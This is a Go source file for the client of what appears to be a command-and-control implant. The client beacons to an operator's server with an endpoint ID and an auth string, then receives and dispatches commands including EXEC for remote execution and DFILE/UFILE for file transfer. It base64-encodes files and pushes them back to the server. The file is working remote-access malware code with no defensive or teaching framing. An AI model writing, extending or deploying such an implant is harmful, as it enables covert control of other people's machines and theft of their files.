package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"strings"
)

// Client hostname is the hostname of the machine running the client
// conn is the net.Conn interface, allows reading and writing of networked data
// cmdBuff is the number of commands the server has buffered for this client. This data is received upon beaconing the server
type Client struct {
	endpointId    string
	hostname      string
	conn          net.Conn
	cmdBuff       int
	beaconRate    int
	authString    string
	downloadQueue map[string]string
	sReader       *bufio.Reader
}

func newClient() *Client {
	host, _ := os.Hostname()
	return &Client{
		endpointId:    EndpointID,
		hostname:      host,
		beaconRate:    3,
		authString:    AuthString,
		downloadQueue: make(map[string]string),
	}
}

func (c *Client) beacon() {
	defer c.conn.Close()
	c.pushMessage("BEACON", c.endpointId, c.authString)

	c.sReader = bufio.NewReader(c.conn)
	data, err := c.sReader.ReadString('\n')
	if err != nil {
		//fmt.Println(err)
		return
	}
	c.setBufferAmount(&c.cmdBuff, data)

	for i := 0; i < c.cmdBuff; i++ {
		data, err := c.sReader.ReadString('\n')
		if err != nil {
			//fmt.Println(err)
			return
		}
		//fmt.Println("RECV: " + data)
		c.handleData(data)
	}
	// Handle file downloads at the end of the beacon communication
	if len(c.downloadQueue) > 0 {
		for {
			data, err := c.sReader.ReadString('\n')
			if err != nil {
				return
			}
			msgArgs := strings.Split(data, "\x02")
			if msgArgs[0] == "FILEEND:" {
				c.removeDownloadQueue(strings.TrimRight(msgArgs[1], "\n"))
				break
			}
			c.handleFile(msgArgs)
		}
	}
}

func (c *Client) handleData(data string) {
	msgArgs := strings.Split(data, "\x02")
	// Trim off "\n" from the last argument
	msgArgs[len(msgArgs)-1] = strings.TrimSuffix(msgArgs[len(msgArgs)-1], "\n")

	if msgArgs[0] == "CMD:" {
		switch strings.TrimSpace(msgArgs[1]) {
		case "PING":
			CmdPing(c)
		case "HOST":
			CmdHost(c)
		case "SET":
			CmdSet(c, msgArgs)
		case "EXEC":
			CmdExec(c, msgArgs)
		case "DFILE":
			CmdDownloadFile(c, msgArgs)
		case "UFILE":
			CmdUploadFile(c, msgArgs)
		default:
			//fmt.Printf("Unsupported CMD: %s\n", msgArgs[1])
			return
		}
	}
	if msgArgs[0] == "FILE:" {
		c.handleFile(msgArgs)
	}
}

func (c *Client) pushMessage(msg string, args ...string) {

	builtMsg := msg
	if len(args) > 0 {
		for _, s := range args {
			builtMsg += "\x02" + s
		}
	}

	c.conn.Write([]byte("MSG:\x02" + builtMsg + "\n"))

	fmt.Println("PUSH: " + "MSG:\x02" + builtMsg + "\n")
}

func (c *Client) PushInterMessage(msg string) {
	payload := base64.StdEncoding.EncodeToString([]byte(msg))
	c.conn.Write([]byte("IMSG:\x02" + payload + "\n"))
	//fmt.Println("PUSH: " + "IMSG:\x02" + payload + "\n")
}

func (c *Client) PushFile(data []byte, remotePath string) {
	payload := base64.StdEncoding.EncodeToString(data)
	c.conn.Write([]byte("FILE:\x02" + remotePath + "\x02" + payload + "\n"))
}

func (c *Client) PushFileEnd(remotePath string) {
	c.conn.Write([]byte("FILEEND:\x02" + remotePath + "\n"))
}

func (c *Client) setBufferAmount(buffRef *int, data string) {
	msgArgs := strings.Split(data, "\x02")

	if len(msgArgs) < 2 {
		return
	}
	if msgArgs[1] != "BUF" {
		//fmt.Printf("Malformed BUF command. %s\n", data)
		return
	}

	_, err := fmt.Sscan(strings.TrimSpace(msgArgs[2]), buffRef)
	if err != nil {
		//fmt.Printf("Malformed BUF command. %s\n", data)
		//fmt.Println(err)
		return
	} else {
		//fmt.Printf("BufAmt set: %d\n", c.cmdBuff)
		return
	}
}

func (c *Client) addDownloadQueue(fileName string, filePath string) {
	c.downloadQueue[fileName] = filePath
}

func (c *Client) removeDownloadQueue(fileName string) {
	if _, exists := c.downloadQueue[fileName]; exists {
		delete(c.downloadQueue, fileName)
		return
	}
	fmt.Println("key not found in downloadQueue: ", fileName)
}

func (c *Client) handleFile(msgArgs []string) {
	if len(msgArgs) < 3 {
		fmt.Println("malformed FILE packet: ", msgArgs)
		return
	}
	if _, ok := c.downloadQueue[msgArgs[1]]; !ok {
		fmt.Println("received file download packet, yet no files are in the downloadQueue: ", msgArgs[1])
		return
	}
	fileName := msgArgs[1]
	data := strings.TrimRight(msgArgs[2], "\n")
	file, err := os.OpenFile(c.downloadQueue[fileName], os.O_APPEND|os.O_RDONLY|os.O_CREATE, os.ModePerm)
	if err != nil {
		fmt.Println("filehandle err: ", err)
		return
	}
	defer file.Close()

	payload, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		fmt.Println("decodeerr: ", err)
		return
	}
	_, err = file.Write(payload)
	if err != nil {
		fmt.Println("filewrite err: ", err)
		return
	}
	file.Sync()
}
